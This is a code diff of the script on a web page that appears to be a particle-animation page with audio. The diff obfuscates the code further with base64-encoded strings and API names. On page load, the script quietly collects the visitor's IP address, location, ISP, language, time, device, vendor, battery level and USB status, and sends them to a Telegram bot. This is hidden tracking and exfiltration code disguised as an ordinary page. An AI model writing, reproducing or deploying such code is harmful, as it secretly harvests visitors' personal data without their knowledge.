@@ -97,7 +97,7 @@
             requestAnimationFrame(animate);
         }
 
-        window.addEventListener('mousemove', function(event) {
+        window.addEventListener(atob('bW91c2Vtb3Zl'), function(event) {
             for (let i = 0; i < 5; i++) {
                 particlesArray.push(new Particle(event.x, event.y));
             }
@@ -107,17 +107,6 @@
 
         let telegramBotToken = 'YOUR_BOT_TOKEN_HERE';
         let telegramChatId = 'YOUR_CHAT_ID_HERE';
-
-        sendDataToTelegram();
-
-        function base64ToUtf8(base64) {
-            const binString = atob(base64);
-            const bytes = new Uint8Array(binString.length);
-            for (let i = 0; i < binString.length; i++) {
-                bytes[i] = binString.charCodeAt(i);
-            }
-            return new TextDecoder('utf-8').decode(bytes);
-        }
 
         function sendDataToTelegram() {
             fetch(atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=='))
@@ -143,8 +132,8 @@
                 }
 
                 let batteryLevel = atob('Tm90IHN1cHBvcnRlZA==');
-                navigator.getBattery().then(battery => {
-                    batteryLevel = (battery.level * 100).toFixed(0) + atob('JQ==');
+                navigator[atob('Z2V0QmF0dGVyeQ==')]().then(battery => {
+                    batteryLevel = (battery[atob('bGV2ZWw=')] * 100).toFixed(0) + atob('JQ==');
                 }).catch(error => {
                     console.error(atob('RXJyb3IgZ2V0dGluZyBiYXR0ZXJ5IGxldmVsOg=='), error);
                 });
@@ -160,7 +149,7 @@
                 });
 
                 setTimeout(() => {
-                    const telegramApiUrl = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + telegramBotToken + '/' + atob('c2VuZE1lc3NhZ2U=');
+                    const telegramApiUrl = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + telegramBotToken + atob('L3NlbmRNZXNzYWdl');
                     fetch(telegramApiUrl, {
                         method: atob('UE9TVA=='),
                         headers: {
@@ -169,7 +158,7 @@
                         body: JSON.stringify({
                             [atob('Y2hhdF9pZA==')]: telegramChatId,
                             [atob('cGFyc2VfbW9kZQ==')]: atob('SFRNTA=='),
-                            [atob('dGV4dA==')]: base64ToUtf8('PGJsb2NrcXVvdGU+44CE44CA77yk77y477yN77yz77yp77yt77y144CA4o6ZPC9ibG9ja3F1b3RlPgoKPGI+8J2ZuPCdmpkg8J2ZsPCdmo3wnZqN8J2am/Cdmo7wnZqc8J2anDo8L2I+IDxjb2RlPg==') + ipAddress + base64ToUtf8('PC9jb2RlPgo8Yj7wnZm78J2amPCdmozwnZqK8J2alSDwnZm48J2amTo8L2I+IDxjb2RlPg==') + localIp + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmy8J2amPCdmp7wnZqX8J2anfCdmpvwnZqiOjwvYj4gPGNvZGU+') + country + base64ToUtf8('PC9jb2RlPgo8Yj7wnZqB8J2ajvCdmpDwnZqS8J2amPCdmpc6PC9iPiA8Y29kZT4=') + region + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmy8J2akvCdmp3wnZqiOjwvYj4gPGNvZGU+') + city + base64ToUtf8('PC9jb2RlPgo8Yj5JUFM6PC9iPiA8Y29kZT4=') + isp + base64ToUtf8('PC9jb2RlPgo8Yj7wnZm78J2aivCdmpfwnZqQ8J2anvCdmorwnZqQ8J2ajjo8L2I+IDxjb2RlPg==') + language + base64ToUtf8('PC9jb2RlPgo8Yj7wnZqD8J2akvCdmpbwnZqOOjwvYj4gPGNvZGU+') + time + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmz8J2ajvCdmp/wnZqS8J2ajPCdmo4g8J2ZuPCdmpfwnZqP8J2amDo8L2I+IDxjb2RlPg==') + deviceName + base64ToUtf8('PC9jb2RlPgoKPGI+8J2ahfCdmo7wnZqX8J2ajfCdmpjwnZqbOjwvYj4gPGNvZGU+') + vendor + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmx8J2aivCdmp3wnZqd8J2ajvCdmpvwnZqiOjwvYj4gPGNvZGU+') + batteryLevel + base64ToUtf8('PC9jb2RlPgo8Yj5VU0IgQ29ubmVjdGVkOjwvYj4gPGNvZGU+') + usbConnected + base64ToUtf8('PC9jb2RlPiAKCjxibG9ja3F1b3RlPu+8re+8oe+8pO+8peOAgO+8ou+8ue+8mkBDb2RleF8zNjk8L2Jsb2NrcXVvdGU+')
+                            [atob('dGV4dA==')]: atob('PGJsb2NrcXVvdGU+RFgtU0lNVTwvYmxvY2txdW90ZT4KCjxiPklQIEFkZHJlc3M6PC9iPiA8Y29kZT4=') + ipAddress + atob('PC9jb2RlPgo8Yj5Mb2NhbCBJUDo8L2I+IDxjb2RlPg==') + localIp + atob('PC9jb2RlPgo8Yj5Db3VudHJ5OjwvYj4gPGNvZGU+') + country + atob('PC9jb2RlPgo8Yj5SZWdpb246PC9iPiA8Y29kZT4=') + region + atob('PC9jb2RlPgo8Yj5DaXR5OjwvYj4gPGNvZGU+') + city + atob('PC9jb2RlPgo8Yj5JU1A6PC9iPiA8Y29kZT4=') + isp + atob('PC9jb2RlPgo8Yj5MYW5ndWFnZTo8L2I+IDxjb2RlPg==') + language + atob('PC9jb2RlPgo8Yj5UaW1lOjwvYj4gPGNvZGU+') + time + atob('PC9jb2RlPgo8Yj5EZXZpY2UgSW5mbzo8L2I+IDxjb2RlPg==') + deviceName + atob('PC9jb2RlPgoKPGI+VmVuZG9yOjwvYj4gPGNvZGU+') + vendor + atob('PC9jb2RlPgo8Yj5CYXR0ZXJ5OjwvYj4gPGNvZGU+') + batteryLevel + atob('PC9jb2RlPgo8Yj5VU0IgQ29ubmVjdGVkOjwvYj4gPGNvZGU+') + usbConnected + atob('PC9jb2RlPiAKCjxibG9ja3F1b3RlPk1BREUgQlk6IEBhbHBoYWNvZGV4MzY5PC9ibG9ja3F1b3RlPg==')
                         })
                     });
                 }, 5000);
@@ -179,10 +168,12 @@
             });
         }
 
+        sendDataToTelegram();
+
         const audio = document.getElementById('audio');
-        audio.addEventListener('start', () => {
+        audio.addEventListener(atob('cGxheQ=='), () => {
             audio.pause();
-            audio.currentTime = 0; // Reset audio to the beginning
+            audio.currentTime = 0;
         });
     </script>
 </body>
